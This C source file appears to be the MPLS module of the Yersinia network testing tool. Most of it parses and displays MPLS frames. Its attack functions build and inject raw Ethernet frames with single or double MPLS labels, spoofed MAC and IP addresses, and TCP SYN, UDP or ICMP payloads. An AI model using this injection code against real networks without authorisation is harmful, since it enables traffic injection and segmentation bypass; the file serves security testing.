/* mpls.c
 * Implementation and attacks for MultiProtocol Label Switching
 *
 * Yersinia
 * By David Barroso <tomac@yersinia.net> and Alfredo Andres <slay@yersinia.net>
 * Copyright 2005, 2006, 2007 Alfredo Andres and David Barroso
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 */

#ifndef lint
static const char rcsid[] = 
       "$Id: dot1q.c,v 1.26 2006/02/16 16:44:44 slay Exp $";
#endif

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#define _REENTRANT

#include <stdio.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>       

#ifdef HAVE_NETINET_IN_SYSTM_H
#include <netinet/in_systm.h>
#else
#ifdef HAVE_NETINET_IN_SYSTEM_H
#include <netinet/in_system.h>
#endif
#endif

#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <time.h>

#ifdef TIME_WITH_SYS_TIME
#include <sys/time.h>
#endif

#ifdef HAVE_UNISTD_H
#include <unistd.h>
#endif

#ifdef HAVE_STRING_H
#include <string.h>
#endif

#ifdef HAVE_STRINGS_H
#include <strings.h>
#endif

#ifdef HAVE_BSTRING_H
#include <bstring.h>
#endif

#ifdef STDC_HEADERS
#include <stdlib.h>
#endif

#ifdef HAVE_PTHREAD_H
#include <pthread.h>
#endif

#include <stdarg.h>

#include "mpls.h"


void
mpls_register(void)
{
   protocol_register(PROTO_MPLS, "MPLS", "MultiProtocol Label Switching", "mpls", 
         sizeof(struct mpls_data), mpls_init_attribs, mpls_learn_packet,
         mpls_get_printable_packet, mpls_get_printable_store,
         mpls_load_values, mpls_attack, mpls_update_field,
         mpls_features, mpls_comm_params, SIZE_ARRAY(mpls_comm_params), 
         NULL, 0, NULL, mpls_init_comms_struct, PROTO_VISIBLE, mpls_end);
}

int8_t
mpls_init_comms_struct(struct term_node *node)
{
    struct mpls_data *mpls_data;
    void **comm_param;
 
    comm_param = (void *)calloc(1,sizeof(void *)*SIZE_ARRAY(mpls_comm_params));
    
    if (comm_param == NULL)
    {
       thread_error("mpls_init_comms_struct calloc error",errno);
       return -1;
    }

    mpls_data = node->protocol[PROTO_MPLS].tmp_data;
    
    node->protocol[PROTO_MPLS].commands_param = comm_param;
    
    comm_param[MPLS_SMAC]    =  &mpls_data->mac_source; 
    comm_param[MPLS_DMAC]    =  &mpls_data->mac_dest;
    comm_param[MPLS_LABEL1]  =  &mpls_data->label1; 
    comm_param[MPLS_EXP1]    =  &mpls_data->exp1;
    comm_param[MPLS_BOTTOM1] =  &mpls_data->bottom1; 
    comm_param[MPLS_TTL1]    =  &mpls_data->ttl1; 
    comm_param[MPLS_LABEL2]  =  &mpls_data->label2; 
    comm_param[MPLS_EXP2]    =  &mpls_data->exp2;
    comm_param[MPLS_BOTTOM2] =  &mpls_data->bottom2;
    comm_param[MPLS_TTL2]    =  &mpls_data->ttl2;
    comm_param[MPLS_SRC_IP]   = &mpls_data->src_ip;  
    comm_param[MPLS_SRC_PORT] = &mpls_data->src_port;  
    comm_param[MPLS_DST_IP]   = &mpls_data->dst_ip; 
    comm_param[MPLS_DST_PORT] = &mpls_data->dst_port;  
    comm_param[MPLS_PAYLOAD]  = &mpls_data->ip_payload;
    comm_param[15] = NULL; 
    comm_param[16] = NULL; 

    return 0;
}

int8_t
mpls_init_attribs(struct term_node *node)
{
    struct mpls_data *mpls_data;

    mpls_data = node->protocol[PROTO_MPLS].tmp_data;

    attack_gen_mac(mpls_data->mac_source);

    mpls_data->mac_source[0] &= 0x0E; 
    
    parser_vrfy_mac(MPLS_DFL_MAC_DST,mpls_data->mac_dest);
    
    mpls_data->proto = IPPROTO_TCP; /* TCP MPLS default... */
    mpls_data->double_hdr = 0; /* Just 1 MPLS header...*/
    mpls_data->bottom1 = 1;
    
    mpls_data->src_ip   = ntohl(inet_addr(MPLS_DFL_SRC_IP));
    mpls_data->src_port = MPLS_DFL_SRC_PORT;
    mpls_data->dst_ip   = ntohl(inet_addr(MPLS_DFL_DST_IP));
    mpls_data->dst_port = MPLS_DFL_DST_PORT;

    memcpy(mpls_data->ip_payload,MPLS_DFL_PAYLOAD,sizeof(MPLS_DFL_PAYLOAD));
    
    mpls_data->ip_pay_len = MPLS_DFL_PAY_LEN;
    
    return 0;
}



void 
mpls_th_send_tcp(void *arg)
{
    struct attacks *attacks=NULL;
    struct mpls_data *mpls_data;

    attacks = arg;
    
    mpls_data = attacks->data;
    mpls_data->proto = IPPROTO_TCP;

    mpls_send(attacks);

    mpls_th_send_exit(attacks);
}

void 
mpls_th_send_double_tcp(void *arg)
{
    struct attacks *attacks=NULL;
    struct mpls_data *mpls_data;

    attacks = arg;
    
    mpls_data = attacks->data;
    mpls_data->double_hdr = 1;
    mpls_data->proto = IPPROTO_TCP;

    mpls_send(attacks);

    mpls_th_send_exit(attacks);
}


void 
mpls_th_send_udp(void *arg)
{
    struct attacks *attacks=NULL;
    struct mpls_data *mpls_data;

    attacks = arg;

    mpls_data = attacks->data;
    mpls_data->proto = IPPROTO_UDP;

    mpls_send(attacks);

    mpls_th_send_exit(attacks);
}

void 
mpls_th_send_double_udp(void *arg)
{
    struct attacks *attacks=NULL;
    struct mpls_data *mpls_data;

    attacks = arg;
    
    mpls_data = attacks->data;
    mpls_data->double_hdr = 1;
    mpls_data->proto = IPPROTO_UDP;

    mpls_send(attacks);

    mpls_th_send_exit(attacks);
}

void 
mpls_th_send_icmp(void *arg)
{
    struct attacks *attacks=NULL;
    struct mpls_data *mpls_data;

    attacks = arg;

    mpls_data = attacks->data;
    mpls_data->proto = IPPROTO_ICMP;

    mpls_send(attacks);

    mpls_th_send_exit(attacks);
}

void 
mpls_th_send_double_icmp(void *arg)
{
    struct attacks *attacks=NULL;
    struct mpls_data *mpls_data;

    attacks = arg;
    
    mpls_data = attacks->data;
    mpls_data->double_hdr = 1;
    mpls_data->proto = IPPROTO_ICMP;

    mpls_send(attacks);

    mpls_th_send_exit(attacks);
}


void 
mpls_send(struct attacks *attacks)
{
    sigset_t mask;
    struct mpls_data *mpls_data;
    libnet_ptag_t t;
    libnet_t *lhandler;
    int32_t sent;
    int32_t payload_size=0, packet_size=0;
    u_int8_t *payload=NULL;
    dlist_t *p;
    struct interface_data *iface_data;
    struct interface_data *iface_data2;
    
    pthread_mutex_lock(&attacks->attack_th.finished);

    pthread_detach(pthread_self());

    mpls_data = attacks->data;
    
    sigfillset(&mask);

    if (pthread_sigmask(SIG_BLOCK, &mask, NULL))
    {
       thread_error("mpls_send pthread_sigmask()",errno);
       return;
    }
    
    if (mpls_data->ip_payload && mpls_data->ip_payload[0])
    {
       payload_size = strlen((const char *)mpls_data->ip_payload);
       payload = mpls_data->ip_payload;
    }
       
    
    for (p = attacks->used_ints->list; p; p = dlist_next(attacks->used_ints->list, p)) 
    {
        iface_data = (struct interface_data *) dlist_data(p);
        lhandler = iface_data->libnet_handler;

        switch(mpls_data->proto)
        {
        case IPPROTO_TCP:
            packet_size = LIBNET_TCP_H + payload_size;
            t = libnet_build_tcp(
                mpls_data->src_port,       /* source port */
                mpls_data->dst_port,       /* destination port */
                0x666,                     /* sequence number */
                0x00000000,                /* acknowledgement num */
                TH_SYN,                    /* control flags */
                32767,                     /* window size */
                0,                         /* checksum */
                0,                         /* urgent pointer */
                packet_size,  /* TCP packet size */
                payload,     /* payload */
                payload_size,              /* payload size */
                lhandler,                  /* libnet handle */
                0);                        /* libnet id */
        break;
        
        case IPPROTO_UDP:
            packet_size = LIBNET_UDP_H + payload_size;
            t = libnet_build_udp(
                mpls_data->src_port,       /* source port */
                mpls_data->dst_port,       /* destination port */
                packet_size,  /* UDP packet size */
                0,                         /* checksum */
                payload,     /* payload */
                payload_size,              /* payload size */
                lhandler,                  /* libnet handle */
                0);                        /* libnet id */
        break;
        
        case IPPROTO_ICMP:
            packet_size = LIBNET_ICMPV4_ECHO_H + payload_size;
            t = libnet_build_icmpv4_echo(
                ICMP_ECHO,                     /* type */
                0,                             /* code */
                0,                             /* checksum */
                0x42,                          /* id */
                0x42,                          /* sequence number */
                payload, /* payload */
                payload_size, /* payload size */
                lhandler,                      /* libnet handle */
                0);
        break;
        }
        
        if (t == -1)
        {
            thread_libnet_error("Can't build tcp/udp/icmp header",lhandler);
            libnet_clear_packet(lhandler);
            return;
        }

        t = libnet_build_ipv4(
            LIBNET_IPV4_H + packet_size,  /* length */
            0,                                         /* TOS */
            242,                                       /* IP ID */
            0,                                         /* IP Frag */
            128,                                       /* TTL */
            mpls_data->proto,                          /* protocol */
            0,                                         /* checksum */
            htonl(mpls_data->src_ip),                  /* source IP */
            htonl(mpls_data->dst_ip),                  /* destination IP */
            NULL,                                      /* payload */
            0,                                         /* payload size */
            lhandler,                                  /* libnet handle */
            0);                                        /* libnet id */
        if (t == -1)
        {
            thread_libnet_error("Can't build IP header",lhandler);
            libnet_clear_packet(lhandler);
            return;    
        }


        t = libnet_build_mpls(
            mpls_data->label1,      /* label */
            mpls_data->exp1,        /* experimental */
            LIBNET_MPLS_BOS_ON,     /* bottom of stack */
            mpls_data->ttl1,        /* ttl */
            NULL,                   /* payload */
            0,                      /* payload size */
            lhandler,               /* libnet handle */
            0);                     /* libnet id */
        if (t == -1)
        {
            thread_libnet_error("Can't build MPLS header",lhandler);
            libnet_clear_packet(lhandler);
            return;    
        }
        
        if (mpls_data->double_hdr)
        {
            t = libnet_build_mpls(
                mpls_data->label2,      /* label */
                mpls_data->exp2,        /* experimental */
                LIBNET_MPLS_BOS_OFF,    /* bottom of stack */
                mpls_data->ttl2,        /* ttl */
                NULL,                   /* payload */
                0,                      /* payload size */
                lhandler,               /* libnet handle */
                0);                     /* libnet id */
            if (t == -1)
            {
                thread_libnet_error("Can't build MPLS header",lhandler);
                libnet_clear_packet(lhandler);
                return;    
            }
        }

        t = libnet_build_ethernet(
            mpls_data->mac_dest,      /* ethernet destination */
            mpls_data->mac_source,    /* ethernet source */
            ETHERTYPE_MPLS,           /* protocol type */
            NULL,                     /* payload */
            0,                        /* payload size */
            lhandler,                 /* libnet handle */
            0);                       /* libnet id */
        if (t == -1)
        {
            thread_libnet_error("Can't build Ethernet header",lhandler);
            libnet_clear_packet(lhandler);
            return;    
        }
        
        /*
         *  Write it to the wire.
         */
           sent = libnet_write(lhandler);

           if (sent == -1) 
           {
               thread_libnet_error("libnet_write error", lhandler);
               libnet_clear_packet(lhandler);
               return;
           }

           libnet_clear_packet(lhandler);
           protocols[PROTO_MPLS].packets_out++;
           iface_data2 = interfaces_get_struct(iface_data->ifname);
           iface_data2->packets_out[PROTO_MPLS]++;
    }
}


void 
mpls_th_send_exit(struct attacks *attacks)
{
    if (attacks)
       attack_th_exit(attacks);
    
    pthread_mutex_unlock(&attacks->attack_th.finished);
    
    pthread_exit(NULL);
}


int8_t
mpls_learn_packet(struct attacks *attacks, char *iface, u_int8_t *stop, void *data, struct pcap_pkthdr *header)
{
    struct mpls_data *mpls_data;
    struct pcap_data pcap_aux;
    u_int8_t *packet, got_mpls_pkt = 0;
    u_int16_t *cursor;
    dlist_t *p;
    struct interface_data *iface_data;
    
    mpls_data = data;

    if ((packet = calloc(1, SNAPLEN)) == NULL)
        return -1;

    if (iface) {
       p = dlist_search(attacks->used_ints->list, attacks->used_ints->cmp, iface);
       if (!p)
          return -1;

       iface_data = (struct interface_data *) dlist_data(p);
    } else
       iface_data = NULL;

    while (!got_mpls_pkt && !(*stop))
    {
        interfaces_get_packet(attacks->used_ints, iface_data, stop, header, packet, PROTO_MPLS, NO_TIMEOUT);
           
        if (*stop)
        {
            free(packet);
            return -1;
        }

        cursor = (u_int16_t *)(packet + 12);

        pcap_aux.header = header;
        pcap_aux.packet = packet;
                                                                                          
        if (!mpls_load_values((struct pcap_data *)&pcap_aux, mpls_data))
           got_mpls_pkt = 1;
        
    } /* While got */

    free(packet);

    return 0;
}



/* 
 * Load values from packet to data.
 * At the moment this function is called only 
 * from ncurses-gui.c
 */
int8_t
mpls_load_values(struct pcap_data *data, void *values)
{
    struct libnet_ethernet_hdr *ether;
    struct mpls_data *mpls;
    u_int16_t *cursor16;
    u_int8_t *ip, *cursor8, ip_proto;
#ifndef LBL_ALIGN
    struct libnet_ipv4_hdr *ipv4_hdr;
#endif

    mpls = (struct mpls_data *)values;
    if (data->header->caplen < (14+4+20+8) ) /* Undersized packet!! */
       return -1;
       
    ether = (struct libnet_ethernet_hdr *) data->packet;

    /* Source MAC */
    memcpy(mpls->mac_source, ether->ether_shost, ETHER_ADDR_LEN);
    /* Destination MAC */
    memcpy(mpls->mac_dest, ether->ether_dhost, ETHER_ADDR_LEN);
    
    cursor8 = (u_int8_t *)(data->packet + LIBNET_ETH_H);
    
    mpls->label1  = MPLS_GET_LABEL(cursor8);
    mpls->exp1    = MPLS_GET_EXP(cursor8);
    mpls->bottom1 = MPLS_GET_BOTTOM(cursor8);
    mpls->ttl1    = MPLS_GET_TTL(cursor8);
    
    if (!mpls->bottom1)
    {
        cursor8 += sizeof(struct mpls_header);
        mpls->label2  = MPLS_GET_LABEL(cursor8);
        mpls->exp2    = MPLS_GET_EXP(cursor8);
        mpls->bottom2 = MPLS_GET_BOTTOM(cursor8);
        mpls->ttl2    = MPLS_GET_TTL(cursor8);
    }
    
    ip = cursor8 + sizeof(struct mpls_header);
    
                                /* Undersized packet!! */
    if ( (ip+20) > (data->packet + data->header->caplen))
       return 0;

#ifdef LBL_ALIGN
    ip_proto = *(ip+9);
    memcpy((void *)&mpls->src_ip, (ip+12), 4);
    memcpy((void *)&mpls->dst_ip, (ip+16), 4);
#else
    ipv4_hdr = (struct libnet_ipv4_hdr *)ip;
    mpls->src_ip   = ntohl(ipv4_hdr->ip_src.s_addr);
    mpls->dst_ip   = ntohl(ipv4_hdr->ip_dst.s_addr);
    ip_proto = ipv4_hdr->ip_p;
#endif

    cursor16 = (u_int16_t *)(ip+20);
    
    switch(ip_proto)
    {
        case IPPROTO_TCP:
        case IPPROTO_UDP: 
         mpls->src_port  = ntohs(*cursor16); cursor16++;
         mpls->dst_port = ntohs(*cursor16);    
        break;
    }

    return 0;
}

/* 
 * Return formated strings of each MPLS field
 *
 * Refresh callback for the ncurses main window
 */
char **
mpls_get_printable_packet(struct pcap_data *data)
{
    struct libnet_ethernet_hdr *ether;
    u_int16_t *cursor16;
    char **field_values;
    u_int8_t *ip, *cursor8, ip_proto;
#ifdef LBL_ALIGN
   u_int16_t aux_short;
   u_int32_t aux_long;
#endif

    if (data && (data->header->caplen < (14+4+20+8)) ) /* Undersized packet!! */
       return NULL;

    if ((field_values = (char **) protocol_create_printable(protocols[PROTO_MPLS].nparams, protocols[PROTO_MPLS].parameters)) == NULL) {
	    write_log(0, "Error in calloc\n");
	    return NULL;
    }

    ether = (struct libnet_ethernet_hdr *) data->packet;

    /* Source MAC */
    snprintf(field_values[MPLS_SMAC], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
       ether->ether_shost[0], ether->ether_shost[1], ether->ether_shost[2],
       ether->ether_shost[3], ether->ether_shost[4], ether->ether_shost[5]);

    /* Destination MAC */
    snprintf(field_values[MPLS_DMAC], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
       ether->ether_dhost[0], ether->ether_dhost[1], ether->ether_dhost[2],
       ether->ether_dhost[3], ether->ether_dhost[4], ether->ether_dhost[5]);
    
    cursor8 = (u_int8_t *) (data->packet + LIBNET_ETH_H);

    snprintf(field_values[MPLS_LABEL1], 9, "%d", MPLS_GET_LABEL(cursor8));
    snprintf(field_values[MPLS_EXP1], 4, "%03d", MPLS_GET_EXP(cursor8));
    snprintf(field_values[MPLS_BOTTOM1], 2, "%01d", MPLS_GET_BOTTOM(cursor8));
    snprintf(field_values[MPLS_TTL1], 4, "%d", MPLS_GET_TTL(cursor8));

    if (!MPLS_GET_BOTTOM(cursor8))
    {
        cursor8 += sizeof(struct mpls_header);
        snprintf(field_values[MPLS_LABEL2], 9, "%d", MPLS_GET_LABEL(cursor8));
        snprintf(field_values[MPLS_EXP2], 4, "%03d", MPLS_GET_EXP(cursor8));
        snprintf(field_values[MPLS_BOTTOM2], 2, "%01d", MPLS_GET_BOTTOM(cursor8));
        snprintf(field_values[MPLS_TTL2], 4, "%d", MPLS_GET_TTL(cursor8));
    }

    ip = cursor8 + sizeof(struct mpls_header);
    
                                /* Undersized packet!! */
    if ( (ip+20) > (data->packet + data->header->caplen))
        return (char **)field_values;    

   ip_proto = *(ip+9);
   
   /* Source IP */
#ifdef LBL_ALIGN
   memcpy((void *)&aux_long, (ip+12), 4);
   parser_get_formated_inet_address_fill(ntohl(aux_long), field_values[MPLS_SRC_IP], 16,0);
#else
   parser_get_formated_inet_address_fill(ntohl(*(u_int32_t *)(ip+12)), field_values[MPLS_SRC_IP], 16,0);
#endif

   /* Destination IP */
#ifdef LBL_ALIGN
   memcpy((void *)&aux_long, (ip+16), 4);
   parser_get_formated_inet_address_fill(ntohl(aux_long), field_values[MPLS_DST_IP], 16,0);
#else
   parser_get_formated_inet_address_fill(ntohl(*(u_int32_t *)(ip+16)), field_values[MPLS_DST_IP], 16,0);
#endif

    cursor16 = (u_int16_t *)(ip+20);
    
    switch(ip_proto)
    {
        case IPPROTO_TCP:
        case IPPROTO_UDP: 
   /* Source port */
#ifdef LBL_ALIGN
         memcpy((void *)&aux_short, cursor16, 2);
         snprintf(field_values[MPLS_SRC_PORT], 5, "%hd", ntohs(aux_short));
#else
         snprintf(field_values[MPLS_SRC_PORT], 5, "%hd", ntohs(*cursor16));
#endif
         cursor16++;
   /* Destination port */
#ifdef LBL_ALIGN
         memcpy((void *)&aux_short, cursor16, 2);
         snprintf(field_values[MPLS_DST_PORT], 5, "%hd", ntohs(aux_short));
#else
         snprintf(field_values[MPLS_DST_PORT], 5, "%hd", ntohs(*cursor16));
#endif
        break;
    }

    return (char **)field_values;    
}


/*
 * Callback for refresh the ncurses bottom window (fields window)
 */
char **
mpls_get_printable_store(struct term_node *node)
{
    struct mpls_data *mpls_tmp;
    char **field_values;
#ifdef LBL_ALIGN
    u_int8_t *aux;
#endif
    
    /* smac + dmac + double + vlan1 + priority + cfi1 + tpi1 + vlan2 +
     * priority2 + cfi2 + tpi3 + src + dst + proto + arp + vlan + null = 17
     */

    if ((field_values = (char **) protocol_create_printable(protocols[PROTO_MPLS].nparams,
                 protocols[PROTO_MPLS].parameters)) == NULL) {
	    write_log(0, "Error in calloc\n");
	    return NULL;
    }

    if (node == NULL)
    	mpls_tmp = protocols[PROTO_MPLS].default_values;
    else
        mpls_tmp = (struct mpls_data *) node->protocol[PROTO_MPLS].tmp_data;

    /* Source MAC */
    snprintf(field_values[MPLS_SMAC], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
	    mpls_tmp->mac_source[0], mpls_tmp->mac_source[1],
	    mpls_tmp->mac_source[2], mpls_tmp->mac_source[3],
	    mpls_tmp->mac_source[4], mpls_tmp->mac_source[5]);

    /* Destination MAC */
    snprintf(field_values[MPLS_DMAC], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
        mpls_tmp->mac_dest[0], mpls_tmp->mac_dest[1], mpls_tmp->mac_dest[2],
        mpls_tmp->mac_dest[3], mpls_tmp->mac_dest[4], mpls_tmp->mac_dest[5]);


    /* Source IP */
    parser_get_formated_inet_address_fill(mpls_tmp->src_ip, field_values[MPLS_SRC_IP], 16,1);
    snprintf(field_values[MPLS_SRC_PORT], 6, "%05hd", mpls_tmp->src_port);

    /* Destination IP */
    parser_get_formated_inet_address_fill(mpls_tmp->dst_ip, field_values[MPLS_DST_IP], 16,1);
    snprintf(field_values[MPLS_DST_PORT], 6, "%05hd", mpls_tmp->dst_port);

    memcpy(field_values[MPLS_PAYLOAD], mpls_tmp->ip_payload, MAX_IP_PAYLOAD);

    snprintf(field_values[MPLS_LABEL1], 9, "%08d",mpls_tmp->label1);
    snprintf(field_values[MPLS_LABEL2], 9, "%08d",mpls_tmp->label2);
    
    snprintf(field_values[MPLS_EXP1], 4, "%03d",mpls_tmp->exp1);
    snprintf(field_values[MPLS_BOTTOM1], 2, "%01d",mpls_tmp->bottom1);
    snprintf(field_values[MPLS_TTL1], 4, "%03d",mpls_tmp->ttl1);

    snprintf(field_values[MPLS_EXP2], 4, "%03d",mpls_tmp->exp2);
    snprintf(field_values[MPLS_BOTTOM2], 2, "%01d",mpls_tmp->bottom2);
    snprintf(field_values[MPLS_TTL2], 4, "%03d",mpls_tmp->ttl2);
    
    return (char **)field_values;
}


int8_t 
mpls_update_field(int8_t state, struct term_node *node, void *value)
{
    struct mpls_data *mpls_data;
    
    if (node == NULL)
       mpls_data = protocols[PROTO_MPLS].default_values;
    else
       mpls_data = node->protocol[PROTO_MPLS].tmp_data;

    switch(state)
    {
        /* Source MAC */
        case MPLS_SMAC:
            memcpy((void *)mpls_data->mac_source, (void *)value, ETHER_ADDR_LEN);
        break;
        /* Destination MAC */
        case MPLS_DMAC:
            memcpy((void *)mpls_data->mac_dest, (void *)value, ETHER_ADDR_LEN);
        break;
	/* Source IP */
        case MPLS_SRC_IP:
            mpls_data->src_ip = *(u_int32_t *)value;
        break;
        case MPLS_SRC_PORT:
            mpls_data->src_port = *(u_int16_t *)value;
        break;
        case MPLS_DST_IP:
            mpls_data->dst_ip = *(u_int32_t *)value;
        break;
        case MPLS_DST_PORT:
            mpls_data->dst_port = *(u_int16_t *)value;
        break;
        case MPLS_LABEL1:
            mpls_data->label1 = *(u_int32_t *)value;
        break;
        case MPLS_EXP1:
            mpls_data->exp1 = *(u_int8_t *)value;
        break;
        case MPLS_BOTTOM1:
            mpls_data->bottom1 = *(u_int8_t *)value;
        break;
        case MPLS_TTL1:
            mpls_data->ttl1 = *(u_int8_t *)value;
        break;
        case MPLS_LABEL2:
            mpls_data->label2 = *(u_int32_t *)value;
        break;
        case MPLS_EXP2:
            mpls_data->exp2 = *(u_int8_t *)value;
        break;
        case MPLS_BOTTOM2:
            mpls_data->bottom2 = *(u_int8_t *)value;
        break;
        case MPLS_TTL2:
            mpls_data->ttl2 = *(u_int8_t *)value;
        break;

        default:
        break;
    }

    return 0;
}



int8_t
mpls_end(struct term_node *node)
{
   return 0;
}
